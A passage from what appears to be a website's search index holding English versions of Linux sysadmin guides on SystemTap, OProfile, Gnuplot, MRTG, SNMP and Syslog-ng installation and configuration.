linkDevelopment linkMake sure you have the debuginfo repository. If not, create this file with the following content (adapt as needed):\n[rhel-debuginfo] name=Red Hat Enterprise Linux $releasever - $basearch - Debug baseurl=ftp://ftp.redhat.com/pub/redhat/linux/enterprise/$releasever/en/os/$basearch/Debuginfo/ enabled=1 Then install these packages:\nyum install systemtap kernel-debuginfo kernel-devel gcc Production linkAs explained in the introduction, the advantage of SystemTap is that on a production machine, there’s only one package to install:\nyum install systemtap-runtime When using a module, check compatibility between the development and production environments with this command:\nmodinfo modulename | grep vermagic If you want to see all modules with their associated kernel version at once:\n\u003e for i in `lsmod | awk '{ print $1 }' | egrep -v '^Module$'` ; do modinfo $i | grep vermagic | xargs echo \"$i :\" ; done fuse : vermagic: 2.6.32-220.el6.x86_64 SMP mod_unload modversions autofs4 : vermagic: 2.6.32-220.el6.x86_64 SMP mod_unload modversions sunrpc : vermagic: 2.6.32-220.el6.x86_64 SMP mod_unload modversions nf_conntrack_ipv4 : vermagic: 2.6.32-220.el6.x86_64 SMP mod_unload modversions nf_defrag_ipv4 : vermagic: 2.6.32-220.el6.x86_64 SMP mod_unload modversions ... Creating a SystemTap Script linkYou can find many examples on the SystemTap website: http://sourceware.org/systemtap/examples/\nThe scripts must use dot notation and support wildcards. Here’s what a hello world script would look like in SystemTap:\n#! /usr/bin/env stap probe begin { println(\"hello world\") exit () } Functions linkMany functions already exist and can be used from /usr/share/systemtap/tapset/*. To call a function, use the probe keyword. Here’s an example:\n#! /usr/bin/env stap probe kernel.function(\"foo\") probe kernel.function(\"*\").return Here’s some information you can find in these scripts to better understand what’s happening:\nioscheduler.elv_next_request: Detects when a request (disk read/write type) is retrieved from the queue ioscheduler.elv_next_request.return: When a request is returned (like a return function in any language) process.exec: The process is going to execute a new program process.release: When the desired process will be released from memory (non-Zombie state) netdev.receive: See the arrival of any network data on all cards tcp.sendmsg: When the kernel sends a TCP frame vm.pagefault: See page faults (when memory is physically allocated/when data is taken from swap…) If you want to get a complete list of all functions available from the kernel:\nstap -p2 -e 'probe kernel.function(\"*\") {}' | sort -u Execution linkStap linkAs you may have understood, the stap command is used to run scripts. This command is to be used on a development machine and is divided into 5 levels/steps:\nParsing the script (checking the SystemTap script syntax) Comparing and verifying symbols/functions with those in kernel-debuginfo Converting SystemTap code to C Creating a Kernel module Loading and launching the module (as well as unloading it, all requiring root privileges) It’s possible to not create a script and directly run the stap command in a shell. You can also define an execution level for this command (for example 2 with the -p option). If you don’t specify one, all 5 levels will be executed and the module will remain loaded until it’s closed (via Ctrl+C).\nLet’s look at an example command line that will place a tracer on the kernel’s sys_open() function and display all calls with their arguments:\nstap -e 'probe syscall.open {printf(\"%s: %s\\n\", execname(), argstr)}' Note: you can use the -k option to keep a trace of your compilation in /tmp to check if there was a problem during a step\nFAQ linkSystemTap ERROR: Build-id mismatch linkIf you observe this type of behavior when compiling a SystemTap module, it’s likely that the kernel-dev version is different from the version of the kernel currently running on your machine. To verify this, compare the Build-id of the running kernel:\n\u003e eu-readelf -n /boot/vmlinuz-`uname -r` | grep \"Build ID\" Build ID: efbb1bd2e40f890370b8f2fc536c991a2d4abda7 With that of the kernel-dev module:\n\u003e eu-readelf -n /usr/lib/debug/lib/modules/my_kernel_version/vmlinux | grep \"Build ID\" Build ID: adcf5270333d375aa5a034523b006373e8f54e48 Here we can see there’s a version problem, which will result in this type of message:\nPass 5: starting execution ERROR: Build-id mismatch: \"kernel\" vs. \"vmlinux\" byte 0 (0xad vs 0xef) address 0xffffffff814f7380 rc 0 Warning: /usr/bin/staprun exited with status: 1 Pass 5: run completed in 10usr/10sys/232real ms. Pass 5: execution failed.Try again with an additional '--vp 00001' option. To solve your problem, just take the correct version of each required packages.\n"
            }
        );
    index.add(
            {
                id:  372 ,
                href: "\/OProfile_:_profilez_votre_syst%C3%A8me\/",
                title: "OProfile: Profile Your System",
                description: "Learn how to use OProfile to profile your system, analyze application performance and monitor resource usage with this comprehensive guide.",
                content: " Introduction linkProfiling linkOProfile is a tool used for profiling.\nProfiling is the process of examining data from various existing data sources (databases, files, etc.) and collecting statistics and information about this data. It is very similar to data analysis.\nProfiling objectives include:\nIdentifying reusable data for other purposes Getting measurements on data quality and compliance with company standards Evaluating risks generated by integrating this data into new applications Evaluating if metadata correctly describes source data Having a good understanding of the impact of source data on upcoming projects to anticipate surprises. Late discovery of data problems can lead to delays and budget overruns (e.g., having to modify a code format in hundreds of places across projects, having to rebuild associated references, having to rediscuss and revalidate contractual documents, etc.) Having a global view of the data to allow reference data management or data governance to enhance data quality OProfile linkOProfile can profile:\nInterrupts Applications and shared libraries Complete system performance Events at regular intervals One big advantage is that it uses minimal system resources.\nOProfile disadvantages:\nOne major drawback of OProfile is that it can miss captures You need to install many development packages to use it, which isn’t always feasible in production environments To better understand how OProfile works, here’s a diagram:\nOProfile aims to be as unintrusive as possible. OProfile loads a kernel driver at boot time that manages hardware performance based on processor counting. The /dev/oprofile device serves as an interface with user mode. The daemon reads this device and stores information in /var/lib/oprofile/samples.\nInstallation linkRed Hat linkOn Red Hat, here’s what we’ll install:\nyum install oprofile oprofile-gui To ensure OProfile will work properly, let’s check that it’s present in the kernel:\n\u003e grep -i PROFIL /boot/config-`uname -r` CONFIG_EVENT_PROFILE=y CONFIG_PROFILING=y CONFIG_OPROFILE=m CONFIG_OPROFILE_EVENT_MULTIPLEX=y CONFIG_HAVE_OPROFILE=y # GCOV-based kernel profiling CONFIG_BRANCH_PROFILE_NONE=y # CONFIG_PROFILE_ANNOTATED_BRANCHES is not set # CONFIG_PROFILE_ALL_BRANCHES is not set CONFIG_FUNCTION_PROFILER=y Only the first two highlighted lines are essential; the others can be useful but are not mandatory.\nNow we need the kernel debug tools:\nyum install kernel-debuginfo Note: kernel-debug is different from kernel-debuginfo\nUsage linkSetup linkBefore using OProfile, you need to define what type of application you want to profile.\nIf you want to profile the kernel, we need to make OProfile start at system boot. Add this line (/etc/rc.local): opcontrol --setup --vmlinux=/usr/lib/debug/lib/modules/`uname -r`/vmlinux If you want to profile an application, then execute this: opcontrol --setup --no-vmlinux It’s possible to reduce the profiling scope. Here’s an example:\nopcontrol --list-events opcontrol --events=CPU_CLK_UNHALTED:400000 --event=DATA_MEM_REFS:10000 Test linkLet’s run a test. First, we’ll reset the current data:\nopcontrol --reset Then we’ll start profiling:\nopcontrol --start Now run the desired tests, and OProfile metrics will be periodically saved under /var/lib/oprofile/samples/. To force this:\nopcontrol --dump Then we’ll stop profiling:\nopcontrol --stop View Results linkFor all applications:\nopreport \u003e ~/oprofile.data If we look at the oprofile.data file, we find this interesting information (~/oprofile.data):\nCPU: CPU with timer interrupt, speed 863.195 MHz (estimated) Profiling through timer interrupt TIMER:0| samples| %| ------------------ 1698146 99.5540 no-vmlinux 1178 0.0691 libc-2.12.so 957 0.0561 libpixman-1.so.0.18.4 839 0.0492 libxul.so 665 0.0390 libpython2.6.so.1.0 569 0.0334 libsqlite3.so 323 0.0189 libglib-2.0.so.0.2200.5 ... samples: Shows how many times the executable was called %: The percentage of CPU time spent executing each executable If you want to profile just one application:\nopreport -l /bin/bash \u003e ~/oprofile.data FAQ linkWhy is the CPU time at 0%? linkThis is because APIC is not enabled. Make sure idle=pool is in grub. Then check that it’s enabled in /proc/cmdline.\nResources linkRed Hat documentation: /usr/share/doc/oprofile-*/oprofile.html\n"
            }
        );
    index.add(
            {
                id:  373 ,
                href: "\/Gnuplot_:_grapher_des_donn%C3%A9es_facilement\/",
                title: "Gnuplot: Graph Data Easily",
                description: "A guide to using Gnuplot to create graphs and visualize data in 2D and 3D formats with examples and configuration.",
                content: " Introduction linkGnuplot is a flexible program that can produce graphical representations in two or three dimensions of numerical functions or data. The program works on all major computers and operating systems and can send graphics to the screen or into files in many formats. Gnuplot also uses the Levenberg-Marquardt algorithm to fit parameters of a numerical function to experimental data.\nThe program is distributed under a free software license that allows copying and modifying the source code of the program. Modified versions of the program can only be distributed as patch files. The program has no connection to the GNU project and does not use the copyleft GPL license.\nThe program can be used interactively and comes with online help. The user enters command line instructions that produce a plot. It is also possible to write Gnuplot scripts that, when executed, generate a graph.\nInstallation linkDebian linkOn Debian, here’s how to install it:\naptitude install gnuplot Red Hat linkOn Red Hat, here’s how to install Gnuplot:\nyum install gnuplot Usage linkWe need to store our information somewhere:\nfor i in {1..3600} ; do uptime | awk '{ print $1, $(NF-2), $(NF-1), $NF}' | tr -d ',' \u003e\u003e ~/gnuplot_datas/load_average.datas sleep 1 done Run the script. It will run every second and store the date with the load average for 1 hour. We will then have a data file that we can output as a graph with gnuplot. Let’s create a configuration file for Gnuplot:\nset term png crop set output '~/gnuplot_datas/load_average.png' set xdata time set timefmt '%H:%M:%S' set xlabel 'Time' set ylabel ' 1 second load average' set yrange [0:] plot '~/gnuplot_datas/load_average.data' using 1:2 with lines I won’t explain each line, as they seem quite self-explanatory. Now we can generate a graph with Gnuplot:\ngnuplot -persist ~/gnuplot_datas/load_average.gplot This will give us a graph like this:\nYou can find plenty of examples on the official Gnuplot website.\n"
            }
        );
    index.add(
            {
                id:  374 ,
                href: "\/MRTG_:_Monitoring_ax%C3%A9_r%C3%A9seau\/",
                title: "MRTG: Network-Focused Monitoring",
                description: "A guide to installing and configuring MRTG (Multi Router Traffic Grapher) for network traffic monitoring using SNMP.",
                content: "Introduction linkMRTG Multi Router Traffic Grapher (MRTG) is software developed under the GNU/GPL license at the initiative of Tobias Oetiker. This software allows you to create graphs of network traffic. It uses the SNMP protocol to query network equipment such as routers, switches, or servers that have an MIB.\nToday, the creators of MRTG have abandoned their project and moved on to Cacti, which is a much more powerful but also much more complex product.\nInstallation linkBefore installing MRTG, enable SNMP on your router. Then, if you’re using Mandrake, run urpmi mrtg, and if you’re using Debian, run aptitude install mrtg. This will install everything MRTG needs.\naptitude install mrtg On Debian, it asks if you want the configuration file to be readable only by the root user. Select yes to this question for security reasons.\nConfiguration linkNow we will tell MRTG where the MRTG destination folder is located, which will be used to display your graphs. You need to put this folder in your web server. To do this, we’ll use the cfgmaker command. Here’s an example that we’ll detail:\ncfgmaker --global 'WorkDir: /var/www/mrtg' --output /var/www/mrtg/routeur.cfg public@X.X.X.X Workdir: This is where your MRTG logs and graphs will be stored (here /var/www represents where the web server data is stored). /var/www/mrtg/routeur.cfg: This corresponds to the name and location where your MRTG configuration file will be stored. public@X.X.X.X: You must replace X.X.X.X with the IP of your router (public is the default name used for authentication). Creating the Index linkNow we need to create the index pages for MRTG. We’ll run the indexmaker command which will use the configuration file to generate an index page:\nindexmaker /var/www/mrtg/routeur.cfg \u003e/var/www/mrtg/index.html /var/www/mrtg/routeurcfg: You need to indicate the location of the MRTG configuration file (the same as the one you specified above). /var/www/mrtg/index.html: Here indicate the location where the index for the MRTG graphs will be located. Creating MRTG Pages linkNow that the MRTG configuration and indexing is done, you need to run the mrtg command followed by the location of your configuration file so that it will retrieve the necessary information from your router and create graphs:\nmrtg /var/www/mrtg/routeur.cfg Once this command is launched, you might get some small errors. To fix this problem, run this line a few more times (2 or 3 should be enough) until it no longer displays error messages.\nAutomating MRTG Graphs linkTo make the graphs automatically update, you just need to integrate it into the crontab. You should use the crontab of the Apache user.\nLog in as www-data and then edit the crontab via the command crontab -e. We’ll now automate all this by updating the graphs every 5 minutes:\n5/* * * * * mrtg /var/www/mrtg/routeur.cfg Your crontab is now configured. You now need to wait about 30 minutes to see something appear on the graphs.\nModifications linkIf you want to change the direction of the MRTG graphs, edit your configuration file (here, routeur.cfg) and at the location Options[_]: growright, bits, uncomment the line (remove the # symbol). This way, the graphs will not go from left to right but from right to left. Edit the file /var/www/mrtg/routeur.cfg:\n# to get bits instead of bytes and graphs growing to the right Options[_]: growright, bits "
            }
        );
    index.add(
            {
                id:  375 ,
                href: "\/SNMP_:_Le_protocole_de_gestion_r%C3%A9seaux\/",
                title: "SNMP: The Network Management Protocol",
                description: "A comprehensive guide to understanding and implementing SNMP (Simple Network Management Protocol) on Linux systems including configuration for both v1 and v3 versions, MIB exploration, and usage examples.",
                content: "Introduction linkNetwork management systems are based on three main elements: a supervisor, nodes, and agents. In SNMP terminology, the term “manager” is more commonly used than “supervisor”. The supervisor is the console that allows the network administrator to execute management requests. Agents are entities located at each interface, connecting the managed equipment (node) to the network and allowing information to be retrieved on different objects.\nSwitches, hubs, routers, workstations, and servers (physical or virtual) are examples of equipment containing manageable objects. These manageable objects can be hardware information, configuration parameters, performance statistics, and other objects that are directly related to the current behavior of the equipment in question. These objects are classified in a tree-like database called MIB (Management Information Base). SNMP enables communication between the supervisor and agents to collect the desired objects in the MIB.\nThe network management architecture proposed by the SNMP protocol is therefore based on three main elements:\nThe managed devices are network elements (bridges, switches, hubs, routers or servers) containing “managed objects” which can be hardware information, configuration elements or statistical information The agents, which are network management applications residing in a device, are responsible for transmitting the local management data of the device in SNMP format Network management systems (NMS), which are the consoles through which administrators can perform administration tasks Versions linkThere are 3 versions of the SNMP protocol:\nV1: The first version uses communities to have access to the protocol V2: This version suffers from incompatible implementations (no standards, each manufacturer does as they wish) V3: Uses USM (User Security Model) to improve security on: Hashed user authentication Encryption of data in transit Management of Information Bases linkSNMP contains hierarchical information in a database for each device. The data is encapsulated as objects called OIDs represented by:\nA table that can contain multiple values A scalar for a single value 2 types of integers for: Counters: non-negative integer, increases to max, then values are reset to zero Gauges: negative or non-negative integer, remains at the max value Installation linkClient linkDebian linkOn Debian, we’ll need the snmp package:\naptitude install snmp Red Hat linkOn Red Hat, we’ll need to install the net-snmp-utils package:\nyum install net-snmp-utils Server linkDebian linkOn Debian, we’ll need the snmpd package:\naptitude install snmpd Red Hat linkOn Red Hat, we’ll need to install the net-snmp package:\nyum install net-snmp Configuration linkServer v1 linkFor a server in v1 configuration, you can configure access using the snmpconf command or the configuration file:\n# read only(ro) or write community(rw) | shared secret | source | oid | # oid: \".1\" = everythings rocommunity public rwcommunity password 192.168.0.0/24 .1 The first line allows anybody to access the rocommunity. The second allows write access to the 192.168.0.0/24 range.\nIf you use the snmpconf command, create a configuration file. But first, you’ll need to move the current one because the command might cause problems otherwise.\nServer v3 linkVersion 3 of the SNMP protocol is different from version 1 in its operation. Before starting, we will stop the SNMP server and it’s very important that it is stopped for the following steps:\n/etc/init.d/snmpd stop We’ll then install the development package to have a very useful tool on Red Hat:\nyum install net-snmp-devel We’ll need to create a user to whom we’ll assign rights (the password must be \u003e= 8 characters):\n\u003e net-snmp-config --create-snmpv3-user -ro -A auth_passphrase -a sha -X private_passphrase -x AES username adding the following line to /var/lib/net-snmp/snmpd.conf: createUser username SHA \"auth_passphrase\" AES private_passphrase adding the following line to /etc/snmp/snmpd.conf: rouser username Here we see that the net-snmp-config tool modified the configuration file by adding the username user. It also registered other information in the /var/lib/net-snmp/snmpd.conf file.\nNow let’s create rights for this user. For that we’ll need to create:\nA group: we’ll define a group to integrate users A view: this view will be used to specify what the defined group is authorized to see (in relation to an SNMP tree) Access: we map access and authentication methods to the group and the chosen view ... rouser username # groupName securityModel securityName group mygroup usm username # name incl/excl subtree mask(optional) view myview included .1 # group context sec.model sec.level prefix read write notif access mygroup any auth exact myview none none Pay attention to the order of insertion of the lines, they are important for the configuration to work.\nThen start the SNMP service:\n/etc/init.d/snmpd start MIBs linkMIBs are translated in this form:\nThe definition of a MIB is therefore in the following form:\nPrefix: IP-MIB::ipForwarding.0 (the 0 is mandatory for scalar values, otherwise it doesn’t work) Numeric ID: .1.3.6.1.2.1.4.1.0 The full name of the object: .iso.org.dod.internet.mgmt.mib-2.ip.ipForwarding.0 The last number is an index corresponding to the value of the OID (indexes working like arrays in Perl):\nReading a MIB linkFor reading, let’s take the example of Linux MIBs:\n... -- -- the IP general group -- some objects that affect all of IPv4 -- ip OBJECT IDENTIFIER ::= { mib-2 4 } ipForwarding OBJECT-TYPE SYNTAX INTEGER { forwarding(1), -- acting as a router notForwarding(2) -- NOT acting as a router } MAX-ACCESS read-write STATUS current DESCRIPTION \"The indication of whether this entity is acting as an IPv4 router in respect to the forwarding of datagrams received by, but not addressed to, this entity. IPv4 routers forward datagrams. IPv4 hosts do not (except those source-routed via the host). When this object is written, the entity should save the change to non-volatile storage and restore the object from non-volatile storage upon re-initialization of the system. Note: a stronger requirement is not used because this object was previously defined.\" ::= { ip 1 } ... ip OBJECT IDENTIFIER ::= { mib-2 4 }: Corresponds to the SNMP prefix ipForwarding OBJECT-TYPE: importing dependencies, such as OBJECT-TYPE DESCRIPTION: we have a description snmpget linkSNMP v1 linkTo retrieve the value of this object, we’ll use the snmpget command which is used to retrieve a single value:\nsnmpget -v1 -c public localhost IP-MIB::ipForwarding.0 -v: We specify the protocol version here (1) -c: the community to use (check the server configuration to know it) Note: If you don’t get anything, it’s probably because you have a permission problem on the server side.\nSNMP v3 linkWe’ve just seen for version 1, now for version 3:\nsnmpget -v3 localhost IP-MIB::ipForwarding.0 -l authPriv -u username -A auth_passphrase -a sha -X private_passphrase -x AES -l: This is the type of security we want for SNMPv3 auth: password for hashed and therefore encrypted authentication priv: password for data encryption authPriv: allows using both types of encryption (authentication + data) authNoPriv: Having authentication without data encryption. -u: the username to use for authentication -A: the passphrase for user authentication -a: the hash algorithm to use for authentication -X: the passphrase shared with the server -x: the encryption algorithm to use for the shared secret Note: If you don’t get anything, it’s probably because you have a permission problem on the server side.\nIf you often have multiple requests to make to the same host, you can create a file that can only contain a single host in ~/.snmp/snmp.conf or /etc/snmp/snmp.conf:\ndefversion 3 defsecurityname username defsecuritylevel authPriv defhtype SHA defauthpassphrase auth_passphrase defprivtype AES defprivpassphrase private_passphrase Now, you no longer need to pass all your arguments, simply the server with the MIB.\nsnmpwalk linkSnmpwalk will retrieve all values. You’ll need to use grep to find the value you want:\n\u003e snmpwalk -v1 -c public localhost SNMPv2-MIB::sysDescr.0 = STRING: Linux localhost.localdomain 2.6.32 #1 SMP Wed Nov 9 08:03:13 EST 2011 x86_64 SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10 DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (121891) 0:20:18.91 SNMPv2-MIB::sysContact.0 = STRING: Root (configure /etc/snmp/snmp.local.conf) SNMPv2-MIB::sysName.0 = STRING: localhost.localdomain SNMPv2-MIB::sysLocation.0 = STRING: Unknown (edit /etc/snmp/snmpd.conf) ... snmpnetstat linkThis tool will retrieve OIDs and display them like the netstat command:\nsnmpnetstat -v1 -c public -Cs localhost Finding MIB Objects linkThe snmptranslate command will help us find MIB objects installed locally on the machine (/usr/share/snmp/mibs/*). For example, to perform a tree search:\n\u003e snmptranslate -TB '.*forward.*' SNMP-COMMUNITY-MIB::snmpProxyTrapForwardGroup SNMP-COMMUNITY-MIB::snmpProxyTrapForwardCompliance IP-MIB::ipv6InterfaceForwarding IP-MIB::ipv6IpForwarding IP-MIB::ipForwarding IP-FORWARD-MIB::ipForward IP-FORWARD-MIB::ipForwardTable IP-FORWARD-MIB::ipForwardEntry IP-FORWARD-MIB::ipForwardMetric5 IP-FORWARD-MIB::ipForwardMetric4 IP-FORWARD-MIB::ipForwardMetric3 IP-FORWARD-MIB::ipForwardMetric2 IP-FORWARD-MIB::ipForwardMetric1 IP-FORWARD-MIB::ipForwardNextHopAS IP-FORWARD-MIB::ipForwardInfo IP-FORWARD-MIB::ipForwardAge IP-FORWARD-MIB::ipForwardProto IP-FORWARD-MIB::ipForwardType IP-FORWARD-MIB::ipForwardIfIndex IP-FORWARD-MIB::ipForwardNextHop IP-FORWARD-MIB::ipForwardPolicy IP-FORWARD-MIB::ipForwardMask IP-FORWARD-MIB::ipForwardDest IP-FORWARD-MIB::ipForwardNumber IP-FORWARD-MIB::ipForwardConformance IP-FORWARD-MIB::ipForwardCompliances IP-FORWARD-MIB::ipForwardOldCompliance IP-FORWARD-MIB::ipForwardCompliance IP-FORWARD-MIB::ipForwardReadOnlyCompliance IP-FORWARD-MIB::ipForwardFullCompliance IP-FORWARD-MIB::ipForwardGroups IP-FORWARD-MIB::ipForwardMultiPathGroup IP-FORWARD-MIB::ipForwardCidrRouteGroup IP-FORWARD-MIB::inetForwardCidrRouteGroup If we want a numeric version:\n\u003e snmptranslate -On IP-FORWARD-MIB::ipForward .1.3.6.1.2.1.4.24 For a complete tree version:\n\u003e snmptranslate -Tp -Of .1.3.6.1.2.1.4.24 +--ipForward(24) +-- -R-- Gauge ipForwardNumber(1) | +--ipForwardTable(2) | | | +--ipForwardEntry(1) | | Index: ipForwardDest, ipForwardProto, ipForwardPolicy, ipForwardNextHop | | | +-- -R-- IpAddr ipForwardDest(1) | +-- CR-- IpAddr ipForwardMask(2) | +-- -R-- Integer32 ipForwardPolicy(3) | | Range: 0..2147483647 | +-- -R-- IpAddr ipForwardNextHop(4) | +-- CR-- Integer32 ipForwardIfIndex(5) | +-- CR-- EnumVal ipForwardType(6) | | Values: other(1), invalid(2), local(3), remote(4) | +-- -R-- EnumVal ipForwardProto(7) | | Values: other(1), local(2), netmgmt(3), icmp(4), egp(5), ggp(6), hello(7), rip(8), is-is(9), es-is(10), ciscoIgrp(11), bbnSpfIgp(12), ospf(13), bgp(14), idpr(15) | +-- -R-- Integer32 ipForwardAge(8) | +-- CR-- ObjID ipForwardInfo(9) ... "
            }
        );
    index.add(
            {
                id:  376 ,
                href: "\/Syslog-ng_:_Installation_et_configuration_de_Syslog-ng\/",
                title: "Syslog-ng: Installation and Configuration of Syslog-ng",
                description: "A guide to install and configure Syslog-ng, a powerful new generation system log manager with advanced features for centralizing, sorting, and securing log data across networks.",
                content: "Introduction linkSyslog-ng is a new generation system log manager. It allows you to centralize logs from machines in a computer network with incredible ease, and to sort them just as easily. This daemon is therefore essential for network administrators concerned about the performance of their machines.\nFree and working on many systems such as Linux, FreeBSD, HP-UX, Solaris or AIX, Syslog-Ng effectively replaces the basic syslogd daemon. It thus allows to overcome its many shortcomings:\nRecognized portability Advanced basic configuration Ability to “chroot” its environment Export of received logs to a MySQL server Possible use of macros for log names Ability to encrypt logs sent via SSL technology Use of UDP and TCP protocols when transporting logs Ability to sort logs according to contents, origin or facility, with the possibility of using regular expressions With it, you can easily retrieve logs from a given machine according to your own criteria, with increased security during their transmission thanks to the power of SSL encryption. Allowing the most advanced processing of logs upon reception, it will prevent you from using Bash or Perl scripts for flat file processing, as was the case when using syslogd.\nInstallation linkDebian linkFor installation on Debian:\napt-get install syslog-ng From Source linkNote: commands starting with # must be executed in root mode.\nFirst, we need to download the archives needed to run Syslog-NG, its own archive as well as the “libol” library.\nDownloading syslog-ng and libol packages with Wget:\nwget http://www.balabit.com/downloads/libol/0.3/libol-0.3.16.tar.gz http://www.balabit.com/downloads/syslog-ng/1.6/src/syslog-ng-1.6.8.tar.gz Unpacking:\n$ gzip -dc syslog-ng-1.6.8.tar.gz Compiling unpacked packages:\n$ cd /usr/local/src/libol-0.3.16 $ ./configure # make \u0026\u0026 make install $ cd /usr/local/src/syslog-ng-1.6.8 $ ./configure # make \u0026\u0026 make install Your system is now equipped with Syslog-ng. You now need to start syslog-ng at boot time, in background, as well as the syslog_mysql.sh script, which we will study in the following pages. To do this, you simply need to create a corresponding service.\nStartup script /etc/init.d/syslog-ng:\n#! /bin/sh # /etc/init.d/syslog-ng # Description: Syslog-ng is the system that # will be used by the machine to monitor # logs from the entire network NAME=syslog-ng DAEMON=/usr/local/sbin/syslog-ng PIDFILE=/var/run/$NAME.pid case \"$1\" in start) echo \"Starting $NAME...\" start-stop-daemon --start --pidfile $PIDFILE \\ --exec $DAEMON PID=`more /var/run/syslog-ng.pid` echo \"MySQL sync system for $NAME...\" /scripts/syslog_mysql.sh $PID \u0026 ;; stop) echo \"Stopping $NAME\" start-stop-daemon --stop --pidfile $PIDFILE \\ --oknodo --exec $DAEMON rm –f /var/log/mysql.pipe ;; *) echo \"Usage of syslog-Ng must be start or stop\" exit 1 esac exit 1 You must then link this script to the usual Run Level of your system.\n$ ln -s /etc/init.d/syslog-ng /etc/rc2.d/S99syslog-ng Configuration linkSyslog-ng loads a configuration file at startup, located in /etc/syslog-ng/syslog-ng.conf. However, you can use another configuration file using the -f option. The file is divided into 5 major sections:\nOptions, to define the general parameters of the log server Sources, to define the different possible sources Destination, to define where the log will be stored Filter, to define the filters operating on logs (content, facility, etc.) Log, to define the actions and handling of logs Logs are processed according to their sources, destinations, and forms (filters). You can indeed ignore a good part of the logs that you receive by setting restrictive filter rules when processing the logs.\nThe options section linkHere is the list of possible parameters to customize the daemon’s operation:\nlog_msg_size(): Maximum size of a message in bytes\nsync(): Number of events before writing to logs\nlog_fifo_size(): The event processing stack, allows storing x lines in memory\ntime_reap(): Closes a log file after x seconds\ntime_reopen(): Number of seconds to wait if the connection is down\ncreate_dirs(): Create log directories if necessary (Yes or No)\nperm() and dir_perm(): Log file and log directory permissions\ngroup() and dir_group(): Group owner of logs and log directories\nowner() and dir_owner(): User owner of logs and log directories\nuse_dns(): Use of DNS servers to resolve names\nlong_hostnames(): Use of long DNS names (On or Off)\ncheck_hostname(): Checks that client DNS name is valid (Yes or No)\nuse_fqdn(): Use of FQDNs in log names (Yes or No)\nkeep_hostname(): Specifies whether to “trust” the hostname (Yes or No)\ndns_cache(), dns_cache_size(), dns_cache_expire(): Activation of DNS cache for x Hosts during X Seconds\nuse_time_recvd(): Use local time instead of timestamp (Yes or No)\ngc_busy_threshold(): Launch of Garbage Collector after X events when syslog-ng is active\ngc_idle_threshold(): Launch of Garbage Collector after X events when syslog-ng is inactive\nThe source section linkWe define the different possible sources of logs. We can define several at once, in order to group several “sources” into a single “virtual” one.\nExample to retrieve logs arriving from 10.0.1.5 in TCP:\nsource ip780 { tcp (ip (\"10.0.1.5\") ); }; Possible sources: file() = opens a given file and reads it internal() = internal messages from syslog-ng pipe(), fifo() = opens a given fifo file and reads it udp(), tcp() = listens on the specified udp or tcp port sun-stream(), sun-streams() = listens for Solaris systems unix-dgram() = reads UNIX sockets in SOCK_DGRAM mode (BSD) unix-stream() = reads UNIX sockets in SOCK_STREAM mode (Linux) If you don’t want to bother, and accept all tcp and udp requests:\nsource s_all { ... udp(); tcp(); }; The destination section linkWe define the different possible destinations for logs. We can define several at once, to send logs to several files for example.\nExample of sending the message via a program, here a perl script, and to a file:\ndestination mailfile { program(\"perl /scripts/log_mailsend.pl $MSG \"); file (\"/var/log/syslog-ng/$YEAR.$MONTH.$DAY/$HOST/logfile.log\"); }; Note that filenames support Macros. This is one of the most interesting aspects of syslog-ng: you can easily sort your log files using easily recognizable and customizable names. Thus, macros allow you to name the log file according to the machine, its IP, the date, etc…\nIn our example, the file could for instance be named /var/log/syslog-ng/2005.10.04/MACHINE/logfile.log.\nPossible destinations:\nfile() = writes to a given file usertty() = sends the log to a given tty fifo(), pipe() = writes to a given fifo file udp(),tcp() = sends the message on the specified port program() = launches a given program and sends it the message unix-dgram() = sends a message containing the log in SOCK_DGRAM unix-stream() = sends a message containing the log in SOCK_STREAM Usable Macros:\nFACILITY: log facility LEVEL or PRIORITY: log level DATE: the date during which the log was sent DAY: the day during which the log was sent HOST: the name of the machine that sent the log YEAR: the year during which the log was sent HOUR: the hour during which the log was sent MIN: the minute during which the log was sent MONTH: the month during which the log was sent SEC: the second during which the log was sent PROGRAM: the name of the program that sent the log FULLDATE: the entire date of the log: with hour, minute and second WEEKDAY: the first three letters of the day during which the log was sent (example: “Wed”) The filter section linkWe define filters to limit the logs taken into account. This is a crucial part of the syslog-ng server, as it allows direct processing of logs upon arrival, without having to parse or process them after reception. This is the section you should mainly focus on.\nExample to retrieve authentication errors:\nfilter auth_errors { level(error) and facility(auth); }; Note the ability to invert them with NOT and use the AND and OR operands\nPossible filters: facility() = the facility of the log level(), priority() = the level of the log filter() = evaluates the log according to another filter netmask() = checks the subnet mask match() = message pattern (supports Regex) host() = the machine presenting the log (supports Regex) program() = the program that generated the log (supports Regex) Caution, Syslog-ng developers recommend using regular expressions as little as possible to avoid overloading the CPU of machines running the daemon. It is therefore better to use several “match” filters, coupled with “AND” operands, rather than using a single “match” filter using Regex. Think carefully before using them!\nThe log section linkThis last part simply allows you to “build” your log captures from the sections we defined earlier. You can therefore completely configure the application according to your needs.\nExample of log section:\nlog exemple { source(ip780); destination(mailfile); filter(auth_errors); }; This example allows you to retrieve authentication errors (filter auth_errors) coming from machine 10.0.1.5 (source ip780) and send them to the file defined in the destination (mailfile).\nExample configuration file linkTo better understand the general system of Syslog-ng, here is an example of a commented basic configuration file:\n# # Configuration file for syslog-ng under Debian # # attempts at reproducing default syslog behavior # the standard syslog levels are (in descending order of priority): # emerg alert crit err warning notice info debug # the aliases \"error\", \"panic\", and \"warn\" are deprecated # the \"none\" priority found in the original syslogd configuration is # only used in internal messages created by syslogd ###### # options options { # disable the chained hostname format in logs # (default is enabled) chain_hostnames(0); # the time to wait before a died connection is re-established # (default is 60) time_reopen(10); # the time to wait before an idle destination file is closed # (default is 60) time_reap(360); # the number of lines buffered before written to file # you might want to increase this if your disk isn't catching with # all the log messages you get or if you want less disk activity # (say on a laptop) # (default is 0) #sync(0); # the number of lines fitting in the output queue log_fifo_size(2048); # enable or disable directory creation for destination files create_dirs(yes); # default owner, group, and permissions for log files # (defaults are 0, 0, 0600) #owner(root); group(adm); perm(0640); # default owner, group, and permissions for created directories # (defaults are 0, 0, 0700) #dir_owner(root); #dir_group(root); dir_perm(0755); # enable or disable DNS usage # syslog-ng blocks on DNS queries, so enabling DNS may lead to # a Denial of Service attack # (default is yes) use_dns(yes); # maximum length of message in bytes # this is only limited by the program listening on the /dev/log Unix # socket, glibc can handle arbitrary length log messages, but -- for # example -- syslogd accepts only 1024 bytes # (default is 2048) #log_msg_size(2048); #Disable statistic log messages. stats_freq(0); }; # Possible sources # Local events source s_localhost { pipe (\"/proc/kmsg\" log_prefix(\"kernel: \")); unix-stream 